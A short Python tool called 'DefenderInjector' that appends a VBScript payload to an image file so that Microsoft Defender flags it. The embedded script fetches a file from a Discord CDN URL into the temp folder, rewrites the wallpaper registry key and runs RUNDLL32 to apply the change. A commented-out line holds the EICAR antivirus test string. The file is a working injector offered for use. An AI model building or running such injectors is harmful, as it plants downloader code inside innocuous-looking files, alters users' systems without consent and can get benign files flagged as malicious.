#!/usr/bin/python3
import argparse

__version__ = '1.0.0'
__progname__ = 'DefenderInjector'

def main():
    parser = argparse.ArgumentParser(usage='\r' + __progname__ + ' ' + __version__ + '\nusage: ./main.py [-h] [-V] input output', prog=__progname__)
    parser.add_argument('input', help='An image input to inject the Microsoft Defender triggerer')
    parser.add_argument('output', help='An image output for resulting image')
    parser.add_argument('-V', '--version', help='Return version', action='version', version=__progname__ + " " + __version__.ljust(len('usage:')))
    args = parser.parse_args()

    file = open(args.input, 'rb')
    file_new = open(args.output, 'wb')
    file_new.write(file.read())
    file_new.write(bytes("""Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")
strDirectory = objShell.ExpandEnvironmentStrings("%temp%")
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://cdn.discordapp.com/emojis/681577625394872370.png?v=1", False
xHttp.Send
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\myImage.png", 2 '//overwrite
end with
objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\myImage.png"
objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
""", 'utf-8'))
    #file_new.write(bytes('X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', 'utf-8'))
    file.close()
    file_new.close()

if __name__ == '__main__':
    main()
